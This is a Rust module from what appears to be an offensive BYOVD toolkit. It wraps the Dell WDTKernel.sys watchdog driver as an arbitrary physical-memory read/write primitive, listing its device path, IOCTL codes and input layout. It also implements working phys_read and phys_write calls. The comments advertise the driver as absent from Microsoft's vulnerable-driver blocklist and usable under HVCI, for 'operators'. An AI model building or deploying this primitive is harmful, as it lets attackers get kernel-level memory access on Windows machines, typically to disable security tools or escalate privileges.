//! WDTKernel.sys — Dell Watchdog Timer (LOLDrivers #290).
//!
//! **Status: NOT blocklisted** as of July 2026. WHQL-attestation signed,
//! distributed via the Microsoft Update Catalog. Loads and functions under
//! HVCI — which is exactly why operators reach for it on HVCI-safe targets.
//!
//! Device: `\\.\__WDT__`
//!
//! ## Protocol (verified against magicsword-io/LOLDrivers issue #290)
//!
//! Unlike RTCore64/iqvw64e (which take kernel VIRTUAL addresses), WDTKernel's
//! memory primitive is PHYSICAL-only: every R/W IOCTL feeds a user-supplied
//! physical address straight to `MmMapIoSpace(physAddr, size, MmNonCached)` with
//! zero validation, then reads/writes the mapping. Ghidra-verified decomp:
//! ```c
//! uint MmioReadDword(PHYSICAL_ADDRESS p)  { uint *m = MmMapIoSpace(p,4,1); uint v=*m; MmUnmapIoSpace(m,4); return v; }
//! void MmioWriteDword(PHYSICAL_ADDRESS p, uint v) { uint *m = MmMapIoSpace(p,4,1); *m=v; MmUnmapIoSpace(m,4); }
//! ```
//! The user-supplied physical address occupies the FIRST 8 bytes of the input
//! buffer; for writes it is followed by the value.
//!
//! R/W IOCTL codes (current code's 0x9C402580/0x9C402584 are fabricated — the
//! real codes are the 0x9C4124xx family):
//! ```text
//!   0x9C412408  Read BYTE     MmMapIoSpace(addr,1,1) then read
//!   0x9C412414  Write BYTE    MmMapIoSpace(addr,1,1) then write value
//!   0x9C412420  Bulk Read BYTE   maps N bytes, copies byte-by-byte to output
//!   0x9C41242C  Bulk Write BYTE  maps N bytes, writes from input buffer
//! ```
//!
//! ## Why raw_rw returns an error (operational-safety contract)
//!
//! [`crate::byovd::VulnDriverIoctl::raw_rw`] — and therefore the
//! [`crate::KernelRw`] impl — hands the driver a kernel VIRTUAL address.
//! WDTKernel cannot consume a VA: it has no VA→PA translator (no
//! `MmGetPhysicalAddress` wrapper IOCTL is exposed). Calling MmMapIoSpace on a
//! virtual address treats its bits as a physical address and maps GARBAGE,
//! yielding silently wrong reads and writes to random physical RAM — on a
//! driver operators pick specifically for HVCI-safe targets, that is an
//! operational-safety failure (BSOD / corruption), not a soft error.
//!
//! Per the BYOVD fix contract ("a clear not-working stub is better than a
//! silently-wrong implementation"), `raw_rw` therefore returns
//! `Err(KrwError::Unavailable(...))` rather than pretending. To use WDTKernel
//! for kernel R/W it must be COMPOSED with a VA→PA step (a DTB page-walk via a
//! separate primitive, or pairing it with a driver that exposes
//! `MmGetPhysicalAddress`); the physical-mode helpers below
//! ([`WdtKernel::phys_read`] / [`WdtKernel::phys_write`]) implement the correct
//! bulk IOCTL protocol for that composition.
//!
//! Source: github.com/magicsword-io/LOLDrivers/issues/290

use crate::byovd::{DeviceIoControlFn, RwOp, VulnDriverIoctl};
use crate::KrwError;
use core::ffi::c_void;
use core::ptr;

pub struct WdtKernel;

/// Bulk read BYTE (physical addr → output buffer), MmMapIoSpace-based.
const WDT_IOCTL_READ_BULK: u32 = 0x9C412420;
/// Bulk write BYTE (input buffer → physical addr), MmMapIoSpace-based.
const WDT_IOCTL_WRITE_BULK: u32 = 0x9C41242C;

impl VulnDriverIoctl for WdtKernel {
    fn device_path(&self) -> &[u16] {
        // \\.\__WDT__ — the real Dell WDT device (NOT "\\.\WatchdogTimer";
        // that path does not exist and would fail CreateFileW). 9 code units
        // after the \\.\ prefix: '_','_','W','D','T','_','_'.
        static PATH: [u16; 11] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            '_' as u16, '_' as u16, 'W' as u16, 'D' as u16,
            'T' as u16, '_' as u16, '_' as u16,
        ];
        &PATH
    }
    // The R/W IOCTLs that raw_rw WOULD use if it could translate VA→PA. Kept
    // accurate (per LOLDrivers #290) so a future VA→PA-composed impl is correct
    // by construction; raw_rw does NOT call them on a raw VA.
    fn read_ioctl(&self) -> u32 { WDT_IOCTL_READ_BULK }
    fn write_ioctl(&self) -> u32 { WDT_IOCTL_WRITE_BULK }
    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026. HVCI-compatible (WHQL)."
    }

    /// KernelRw hands us a kernel VIRTUAL address; WDTKernel can only consume
    /// PHYSICAL addresses (MmMapIoSpace, no VA→PA wrapper). Returning a clear
    /// error here is correct: silently feeding a VA to MmMapIoSpace corrupts
    /// random physical RAM. See the module doc for the composition story.
    unsafe fn raw_rw(
        &self,
        _op: RwOp,
        _kaddr: u64,
        _buf: &mut [u8],
        _device: *mut c_void,
        _dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        // Cannot satisfy the VA-based KernelRw contract; signal failure via
        // the Partial path with ok=0. The caller wraps this as
        // KrwError::Partial { ok: 0 }; bootstrap surfaces it to the operator
        // (see the module doc — a clear not-working stub beats a silent one).
        Err(0)
    }
}

impl WdtKernel {
    /// Physical-memory read via the bulk-read BYTE IOCTL. For callers that
    /// already have a PHYSICAL address (e.g. a DTB page-walk composing on top
    /// of WDTKernel). NOT exposed through `KernelRw` (which is VA-based).
    ///
    /// # Safety
    /// `dioctl` must be `kernel32!DeviceIoControl` and `device` a valid HANDLE
    /// to `\\.\__WDT__`. `phys_addr` must be a real physical address.
    pub unsafe fn phys_read(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &mut [u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        // Input buffer = 8-byte physical address. The driver MmMapIoSpace-maps
        // it and copies `buf.len()` bytes into the output buffer.
        let mut input = [0u8; 8];
        input.copy_from_slice(&phys_addr.to_le_bytes());
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                WDT_IOCTL_READ_BULK,
                input.as_ptr() as *const c_void,
                input.len() as u32,
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(KrwError::Other(
                "WDTKernel phys_read IOCTL failed (invalid physical address?)".into(),
            ))
        } else {
            Ok(())
        }
    }

    /// Physical-memory write via the bulk-write BYTE IOCTL. Counterpart to
    /// [`phys_read`](Self::phys_read).
    ///
    /// # Safety
    /// Same contract as [`phys_read`](Self::phys_read).
    pub unsafe fn phys_write(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &[u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        // Input buffer = 8-byte physical address + payload. The driver
        // MmMapIoSpace-maps the address and writes the payload to it.
        let mut input: alloc::vec::Vec<u8> = alloc::vec![0u8; 8 + buf.len()];
        input[..8].copy_from_slice(&phys_addr.to_le_bytes());
        input[8..].copy_from_slice(buf);
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                WDT_IOCTL_WRITE_BULK,
                input.as_ptr() as *const c_void,
                input.len() as u32,
                ptr::null_mut(),
                0,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            Err(KrwError::Other(
                "WDTKernel phys_write IOCTL failed (invalid physical address?)".into(),
            ))
        } else {
            Ok(())
        }
    }
}
